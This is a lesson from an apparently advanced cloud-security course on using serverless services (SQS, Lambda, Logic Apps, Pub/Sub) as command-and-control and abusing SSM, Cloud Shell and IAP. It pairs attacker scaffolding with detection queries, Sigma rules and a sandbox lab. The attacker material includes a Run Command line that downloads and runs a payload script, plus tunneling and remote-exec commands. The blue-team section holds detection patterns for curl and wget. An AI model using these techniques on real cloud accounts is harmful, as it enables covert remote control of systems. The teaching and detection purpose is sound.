# 10 — Serverless as C2 & Living Off the Land

> **Level:** Advanced
> **Prereqs:** [Serverless Function Security](../Compute-Container-Security/serverless-function-security.md) through [Container Escape Classes](../Compute-Container-Security/container-escape-classes.md); [Lateral Movement & Pivoting](lateral-movement-and-pivoting.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Command and Control (T1650, T1102, T1572), Defense Evasion (T1574, T1205)
**Authorization scope:** Run only against your own sandbox accounts / sanctioned engagement with written authorization. No live C2 code shipped — educational scaffolding only. All resources, ARNs, domains use placeholders.

## What & why
Serverless C2 uses cloud-managed services (Lambda, Cloud Functions, SQS, EventBridge, Logic Apps, Cloud Scheduler) as command-and-control infrastructure. Living-off-the-land (LOTL) means using legitimate administrative tools (SSM, Cloud Shell, Run Command, IAP) that are already trusted in the environment. Both approaches let attackers blend into normal cloud traffic and bypass network-based C2 detection.

## The OnPrem reality
On-prem C2 traditionally means a custom binary beaconing to an attacker-controlled domain over HTTP/HTTPS/DNS, or using built-in tools like `certutil`, `bitsadmin`, and PowerShell remoting. LOTL in Windows means `mshta`, `regsvr32`, WMI, and `cscript` — all Microsoft-signed, all "normal."

## Core concepts

### Serverless C2 primitives

| Primitive | How It Works | Why It's Appealing |
|---|---|---|
| **SQS/Lambda message broker** | Attacker publishes commands to an SQS queue; Lambda polls queue, executes, returns results to response queue | No long-lived server; SQS+Lambda are "infrastructure," not malware |
| **S3 dead-drop** | Commands written as S3 objects; implant polls bucket listing | S3 is ubiquitous cloud storage; `ListObjects` blends with normal apps |
| **DynamoDB as shared state** | Command rows inserted into a table; implant scans for new rows | NoSQL operational pattern; hard to distinguish from app data |
| **EventBridge + Lambda** | Scheduled rule triggers Lambda; Lambda executes logic and updates DynamoDB | Fully serverless; no EC2 instances; no open ports |
| **API Gateway + Lambda** | REST endpoint receives commands; Lambda executes and returns results | HTTPS traffic to amazonaws.com — completely benign |
| **CloudFormation stack update** | Attacker updates stack parameters as a signaling mechanism | Infrastructure-as-code change — looks like a deployment |
| **Route 53 DNS as C2 signal** | TXT record changes to signal implant state | DNS queries to authoritative Route 53 — no external domains |

### Living-off-the-land primitives

| LOTL Primitive | AWS | Azure | GCP |
|---|---|---|---|
| **Shell access** | SSM Session Manager (`ssm:StartSession`) | Azure Cloud Shell | GCP Cloud Shell |
| **Remote execution** | SSM Run Command (`ssm:SendCommand`) | Run Command (AZ CLI `az vm run-command`) | OS Login + IAP Tunnel |
| **Fleet management** | AWS Systems Manager Fleet Manager | Azure Arc + Extensions | OS Configuration Management |
| **Container exec** | ECS Exec (`ecs:ExecuteCommand`) | AKS `kubectl exec` via MI | GKE `kubectl exec` via Workload Identity |
| **Pre-authenticated CLIs** | AWS CLI on EC2 (instance profile) | `az cli` in Cloud Shell (pre-auth) | `gcloud` in Cloud Shell (pre-auth) |
| **Tunneling** | SSM port forwarding (`ssm:StartSession` with `--port`) | Azure Bastion | IAP TCP forwarding |
| **File transfer** | SSM `SendCommand` with S3 download | `az storage blob download` via MI | `gsutil cp` via SA |

## AWS

### Serverless C2 via SQS + Lambda (scaffolding — no live code)

**Architecture pattern:**
```
Attacker → SQS Cmd Queue → Lambda (executor) → SQS Response Queue → Attacker
                ↑                              ↓
          DynamoDB (task state)         DynamoDB (results)
```

**Conceptual setup (contained — your sandbox):**

```bash
# Queue for commands
aws sqs create-queue --queue-name cmd-ingest --attributes VisibilityTimeout=60

# Queue for responses
aws sqs create-queue --queue-name cmd-response

# Lambda execution role (administrator for the Lambda itself)
aws lambda create-function \
  --function-name task-processor \
  --runtime python3.9 \
  --role arn:aws:iam::111111111111:role/lambda-executor \
  --handler index.handler \
  --code S3Bucket=lambda-code-bucket,S3Key=task-processor.zip

# Map the SQS queue as a Lambda trigger
aws lambda create-event-source-mapping \
  --function-name task-processor \
  --event-source-arn arn:aws:sqs:us-east-1:111111111111:cmd-ingest \
  --batch-size 1

# The Lambda polls SQS for messages. When a message arrives:
# 1. Lambda reads the "command" from the SQS message body
# 2. Lambda executes the AWS API call or shell command
# 3. Lambda writes results to DynamoDB or sends to response queue
```

**No live C2 code is provided in this lesson.** The pattern above is sufficient to understand the architecture. Students should construct this only in their sandbox and for detection-engineering purposes.

### LOTL: SSM Session Manager as backdoor

```bash
# SSM Session Manager provides a shell on EC2 instances without SSH.
# It's a legitimate AWS service — the agent is pre-installed on Amazon Linux 2 AMIs.

# Start a session (management event logged):
aws ssm start-session --target i-0abcdef1234567890

# Port forwarding (tunnel out through the instance's VPC):
aws ssm start-session \
  --target i-0abcdef1234567890 \
  --document-name AWS-StartPortForwardingSession \
  --parameters '{"portNumber":["3389"],"localPortNumber":["13389"]}'
# Now localhost:13389 tunnels to the instance's RDP port — via AWS infrastructure

# Run Command — execute scripts remotely:
aws ssm send-command \
  --document-name AWS-RunShellScript \
  --targets "Key=InstanceIds,Values=i-0abcdef1234567890" \
  --parameters '{"commands":["aws s3 cp s3://staging-bucket/payload.sh /tmp/payload.sh && bash /tmp/payload.sh"]}'
```

**Detection:** `StartSession` is logged in CloudTrail. `SendCommand` is logged in CloudTrail with the full command parameters. SSM Agent logs on the instance record executed commands.

### LOTL: ECS Exec into containers

```bash
# Execute a shell inside a running ECS container — no SSH, no bastion
aws ecs execute-command \
  --cluster prod-cluster \
  --task abc123def456789 \
  --container app \
  --command "/bin/bash" \
  --interactive
# CloudTrail: ExecuteCommand event
# Container stdout not logged by default — requires ECS exec logging to CloudWatch
```

## Azure

### Serverless C2 via Logic Apps + Storage Queue (scaffolding)

```
Attacker → Storage Queue (command) → Logic App (polling trigger) → Azure Function (action) → Storage Queue (response)
```

```bash
# Conceptual flow only — no operational C2
# 1. Create a Storage Queue
az storage queue create --name c2-commands --account-name stagingassets2026

# 2. Create a Logic App with a queue trigger
az logic workflow create \
  --name "DataSyncProcessor" \
  --resource-group example-rg \
  --definition '{"triggers":{"When_there_are_messages_in_a_queue":{"type":"ServiceProvider","inputs":{"parameters":{"queueName":"c2-commands"},"serviceProviderConfiguration":{"connectionName":"azurequeues"}}}}}'

# 3. The Logic App processes each queue message and calls Azure Functions or APIs
# 4. Results are written to a response queue or blob
```

### LOTL: Azure Cloud Shell

```bash
# Cloud Shell is a browser-based terminal accessible from portal.azure.com
# It provides:
# - Pre-authenticated az CLI
# - Persistent $HOME (5 GB, stored in a storage account)
# - No command-level audit by default

# An attacker with Azure AD credentials can:
# - Access Cloud Shell from anywhere
# - Run az cli commands using the user's IAM permissions
# - Stage scripts in $HOME/scripts/
# - Use tmux to maintain persistent sessions
# - Download/upload files via the Cloud Shell file share

# Detection:
az monitor activity-log list --resource-type "Microsoft.Portal/userSettings" --offset 1h
# Cloud Shell start is logged as an Activity Log event
```

### LOTL: Run Command on Azure VMs

```bash
# Execute scripts on a VM without SSH/RDP
az vm run-command invoke \
  --resource-group example-rg \
  --name example-vm \
  --command-id RunShellScript \
  --scripts "whoami && id && aws s3 ls"
# Activity Log: VirtualMachineRunCommand event
```

## GCP

### Serverless C2 via Pub/Sub + Cloud Function (scaffolding)

```
Attacker → Pub/Sub topic → Cloud Function (trigger) → Compute API → Pub/Sub response topic
```

```bash
# Conceptual flow — no operational C2
# 1. Create Pub/Sub topic for commands
gcloud pubsub topics create c2-commands

# 2. Deploy a Cloud Function triggered by Pub/Sub
gcloud functions deploy task-executor \
  --runtime python39 \
  --trigger-topic c2-commands \
  --entry-point execute_task \
  --service-account=func-sa@example-project.iam.gserviceaccount.com

# 3. Create a response topic
gcloud pubsub topics create c2-responses

# 4. Attacker publishes a message to c2-commands
gcloud pubsub topics publish c2-commands --message='{"action":"list_users","target":"example-project"}'
# 5. Cloud Function executes, publishes results to c2-responses
```

### LOTL: GCP Cloud Shell + IAP

```bash
# Cloud Shell (browser-based) provides:
# - Pre-authenticated gcloud CLI
# - Persistent $HOME (5 GB)
# - Built-in code editor
# - Access to all GCP APIs the user has permissions for

# IAP (Identity-Aware Proxy) TCP forwarding:
gcloud compute start-iap-tunnel instance-1 22 \
  --local-host-port=localhost:2222 \
  --zone=us-central1-a
# Creates an SSH tunnel through Google's IAP infrastructure
# No public IP needed on the instance
# No SSH port open to the internet

# Detection: 
# IAP tunnel start is logged: protoPayload.methodName="google.cloud.iap.v1.TunnelService.StartIapTunnel"
# Cloud Shell start: protoPayload.methodName="google.cloud.shell.v1.CloudShellService.StartEnvironment"
```

## OnPrem mapping (recap table)

| LOTL / C2 Primitive | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Remote shell | SSH / RDP | SSM Session Manager | Cloud Shell | Cloud Shell + IAP |
| Remote exec | PsExec, WinRM | SSM Run Command (`SendCommand`) | VM Run Command (`az vm run-command`) | OS Login |
| Port forwarding | SSH `-L` / `-R` | SSM port forwarding | Azure Bastion tunnel | IAP TCP forwarding |
| Message-based C2 | Slack webhook, Telegram bot | SQS + Lambda | Storage Queue + Logic App | Pub/Sub + Cloud Function |
| Dead-drop C2 | FTP server, pastebin | S3 object polling | Blob storage polling | GCS object polling |
| Scheduled task | Cron, Task Scheduler | EventBridge rule + Lambda | Logic App recurrence | Cloud Scheduler + Cloud Function |
| Pre-installed tooling | PowerShell, `certutil` | AWS CLI on EC2 | `az cli` in Cloud Shell | `gcloud` in Cloud Shell |

## 🔴 Red Team view

### Why serverless C2 is appealing

1. **No attacker-owned infrastructure.** No domains to sinkhole, no IPs to block, no TLS certificates to revoke. Everything runs on `amazonaws.com`, `azure.com`, or `googleapis.com`.

2. **Scales to zero cost.** Lambda and Cloud Functions cost nothing when idle. SQS and DynamoDB on-demand have negligible costs at low volume. The C2 "infrastructure" disappears when not in use.

3. **Traffic blends in.** HTTPS connections to `sqs.us-east-1.amazonaws.com`, `storage.googleapis.com`, `blob.core.windows.net` are present in virtually every cloud environment. A C2 channel over these endpoints is indistinguishable from normal application traffic at the network layer.

4. **Built-in resilience.** Lambda retries on failure. SQS dead-letter queues catch failed commands. EventBridge rules restart if deleted (if part of a CloudFormation stack with termination protection).

5. **No persistence on disk.** The C2 server is a Lambda function — no binary, no process, no open port on any EC2 instance.

### Lambda + SQS long-poll as message broker (diagram)

```
┌──────────┐     ┌─────────────┐     ┌──────────────┐     ┌───────────────┐
│ Attacker │────▶│ SQS Cmd     │────▶│ Lambda       │────▶│ Target AWS    │
│ (outside)│     │ Queue       │     │ (executor)   │     │ API / Env     │
└──────────┘     └─────────────┘     └──────────────┘     └───────────────┘
       ▲                                   │                      │
       │         ┌─────────────┐           │                      │
       └─────────│ SQS Resp    │◀──────────┘                      │
                 │ Queue       │                                   │
                 └─────────────┘                                   │
                                                          ┌────────┴──────┐
                                                          │ DynamoDB      │
                                                          │ (task log)    │
                                                          └───────────────┘
```

**Artifacts:** `sqs:SendMessage`, `sqs:ReceiveMessage`, `lambda:InvokeFunction`, `dynamodb:PutItem` — all in CloudTrail. Every command execution is logged.

### LOTL: SSM Session Manager as covert channel

An attacker maintaining access through SSM:
- No SSH daemon to detect on the instance.
- No `auth.log` entries.
- No `~/.ssh/authorized_keys` modification.
- The SSM Agent is signed by Amazon and pre-installed on Amazon Linux 2.
- Session content is only logged if explicitly configured.

**Detection tip:** Alert on `StartSession` from a principal that doesn't normally use SSM, or from an IP outside the corporate range.

## 🔵 Blue Team view

### Detecting serverless C2

**1. Unusual Lambda invocations from non-application sources:**

```sql
SELECT eventtime, useridentity.arn, eventname, sourceipaddress
FROM cloudtrail_logs
WHERE eventname = 'InvokeFunction20150331'
  AND useridentity.type = 'IAMUser'
  AND useridentity.arn NOT LIKE '%ci-role%'
  AND eventtime > now() - interval '1' day;
```

**2. New SQS queue created in production account:**

```sql
SELECT eventtime, useridentity.arn, requestparameters.queueName
FROM cloudtrail_logs
WHERE eventname = 'CreateQueue'
  AND eventtime > now() - interval '1' day;
```

**3. New Lambda function created outside CI/CD:**

```sql
SELECT eventtime, useridentity.arn, requestparameters.functionName
FROM cloudtrail_logs
WHERE eventname = 'CreateFunction20150331'
  AND useridentity.arn NOT LIKE '%:role/ci-%'
  AND useridentity.arn NOT LIKE '%:role/terraform-%'
  AND eventtime > now() - interval '1' day;
```

### Detecting LOTL abuse

**1. SSM sessions from unusual IP or region:**

```sql
SELECT eventtime, useridentity.arn, sourceipaddress, awsregion
FROM cloudtrail_logs
WHERE eventname = 'StartSession'
  AND eventtime > now() - interval '1' day
  AND (
    sourceipaddress NOT LIKE '10.%'  -- not internal
    OR awsregion NOT IN ('us-east-1', 'us-east-2')  -- not normal regions
  );
```

**2. CloudShell usage from new IP or new user:**

```sql
-- GCP: Cloud Shell starts
SELECT timestamp, protoPayload.authenticationInfo.principalEmail
FROM cloudaudit_googleapis_com_data_access
WHERE protoPayload.methodName LIKE '%CloudShellService%StartEnvironment%'
  AND timestamp > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 1 DAY);

-- Azure: Cloud Shell usage
# az monitor activity-log list --resource-type "Microsoft.Portal/userSettings" --offset 1h
```

**3. Run Command / SendCommand with unusual payloads:**

```sql
SELECT eventtime, useridentity.arn, requestparameters.parameters.commands
FROM cloudtrail_logs
WHERE eventname = 'SendCommand'
  AND (
    requestparameters.parameters.commands LIKE '%curl%'
    OR requestparameters.parameters.commands LIKE '%wget%'
    OR requestparameters.parameters.commands LIKE '%base64%'
  )
  AND eventtime > now() - interval '1' day;
```

### Preventive controls

| Control | AWS | Azure | GCP |
|---|---|---|---|
| Restrict SSM sessions | IAM policy: deny `ssm:StartSession` for non-admin users | N/A (Cloud Shell is user-scoped) | IAM: deny `iap.tunnelInstances` for non-admins |
| Block external SQS/Lambda creation | SCP: deny `sqs:CreateQueue`, `lambda:CreateFunction` outside CI roles | Azure Policy: deny Logic App creation outside specific RGs | Org policy: deny Cloud Function deployment to untrusted projects |
| Monitor all Lambda triggers | CloudTrail: `CreateEventSourceMapping` alerts | Activity Log: Logic App trigger changes | Cloud Audit: `UpdateFunction` event |
| Cloud Shell restrictions | N/A (no AWS Cloud Shell) | Conditional Access: block Cloud Shell from untrusted IPs | Context-aware access: restrict Cloud Shell to corporate IPs |
| Session content logging | Enable SSM session logging to S3 | Enable Cloud Shell diagnostics | Enable Cloud Shell `$HOME` monitoring |

### Baseline user behavior for Cloud Shell

```bash
# Establish baseline: which users normally use Cloud Shell?
# GCP
gcloud logging read 'protoPayload.methodName="google.cloud.shell.v1.CloudShellService.StartEnvironment"' \
  --format='table(timestamp, protoPayload.authenticationInfo.principalEmail)' --limit 50

# Azure
az monitor activity-log list --resource-type "Microsoft.Portal/userSettings" \
  --offset 30d --query "[].{User:caller,Time:eventTimestamp}" -o table

# Alert on deviations: new users, new IPs, new regions
```

## Hands-on lab

**Objective:** Set up a benign version of an SQS + Lambda pipeline and observe all CloudTrail events generated.

1. **Create an SQS queue and Lambda:**
   ```bash
   aws sqs create-queue --queue-name lab-event-processor
   QUEUE_ARN=$(aws sqs get-queue-url --queue-name lab-event-processor --query 'QueueUrl' --output text)

   mkdir -p /tmp/lab-lambda
   cat > /tmp/lab-lambda/index.py << 'EOF'
   import json
   def handler(event, context):
       for record in event['Records']:
           body = json.loads(record['body'])
           print(f"Processed: {body.get('action', 'unknown')}")
       return {"statusCode": 200}
   EOF
   cd /tmp/lab-lambda && zip -r /tmp/lab-function.zip index.py

   aws lambda create-function \
     --function-name lab-event-processor \
     --runtime python3.9 \
     --role arn:aws:iam::111111111111:role/lambda-basic-execution \
     --handler index.handler \
     --zip-file fileb:///tmp/lab-function.zip

   aws lambda create-event-source-mapping \
     --function-name lab-event-processor \
     --event-source-arn "$QUEUE_ARN" \
     --batch-size 1
   ```

2. **Send a test message and check CloudTrail:**
   ```bash
   QUEUE_URL=$(aws sqs get-queue-url --queue-name lab-event-processor --query 'QueueUrl' --output text)
   aws sqs send-message --queue-url "$QUEUE_URL" --message-body '{"action":"test","target":"sandbox"}'

   sleep 30
   aws cloudtrail lookup-events --lookup-attributes \
     AttributeKey=EventName,AttributeValue=SendMessage --max-results 3
   aws cloudtrail lookup-events --lookup-attributes \
     AttributeKey=EventName,AttributeValue=InvokeFunction20150331 --max-results 3
   ```

3. **Test SSM session detection:**
   ```bash
   # Try to start a session (may fail without managed instances)
   aws ssm start-session --target i-00000000000000000 2>&1 | head -5
   
   # Check if any sessions happened recently
   aws cloudtrail lookup-events --lookup-attributes \
     AttributeKey=EventName,AttributeValue=StartSession --max-results 5
   ```

**Expected output:** CloudTrail shows `CreateQueue`, `CreateFunction`, `CreateEventSourceMapping`, `SendMessage`, `InvokeFunction` events in sequence.

**Teardown:**
```bash
aws lambda delete-event-source-mapping --uuid $(aws lambda list-event-source-mappings --function-name lab-event-processor --query 'EventSourceMappings[0].UUID' --output text)
aws lambda delete-function --function-name lab-event-processor
aws sqs delete-queue --queue-url $(aws sqs get-queue-url --queue-name lab-event-processor --query 'QueueUrl' --output text)
```

## Detection rules & checklists

### Sigma rule: New SQS queue created in production

```yaml
title: SQS Queue Created in Production Account
status: experimental
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName: CreateQueue
  filter:
    userIdentity.arn|contains: 'terraform'
  condition: selection and not filter
level: medium
```

### Sigma rule: SSM session from external IP

```yaml
title: SSM Session Started from Non-Corporate IP
status: experimental
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName: StartSession
  filter:
    sourceIPAddress|cidr: '10.0.0.0/8'
    sourceIPAddress|cidr: '172.16.0.0/12'
  condition: selection and not filter
level: high
```

### Checklist

- [ ] Alert on `CreateQueue` outside CI/CD
- [ ] Alert on `CreateFunction` outside CI/CD
- [ ] Alert on `CreateEventSourceMapping`
- [ ] Alert on `StartSession` from non-corp IP
- [ ] Alert on `SendCommand` with download commands (curl, wget)
- [ ] SSM session logging enabled (S3 + CloudWatch)
- [ ] ECS exec logging enabled
- [ ] Azure Cloud Shell usage baselined; alert on anomalies
- [ ] GCP Cloud Shell usage baselined; alert on anomalies
- [ ] SCP denies `ssm:StartSession` for non-breakglass roles
- [ ] Audit all Lambda triggers monthly

## References

- [AWS SSM Session Manager](https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html)
- [AWS ECS Exec](https://docs.aws.amazon.com/AmazonECS/latest/developerguide/ecs-exec.html)
- [Azure Cloud Shell](https://learn.microsoft.com/en-us/azure/cloud-shell/overview)
- [GCP Cloud Shell](https://cloud.google.com/shell)
- [GCP IAP](https://cloud.google.com/iap/docs/using-tcp-forwarding)
- [MITRE ATT&CK Serverless (T1650)](https://attack.mitre.org/techniques/T1650/)
- [MITRE ATT&CK LOTL (T1574, T1205)](https://attack.mitre.org/tactics/TA0005/)
- See also: [09-07-persistence-techniques-in-cloud.md](./persistence-techniques-in-cloud.md)
- See also: [Compute Container Security — container-escape-classes.md](../Compute-Container-Security/container-escape-classes.md)
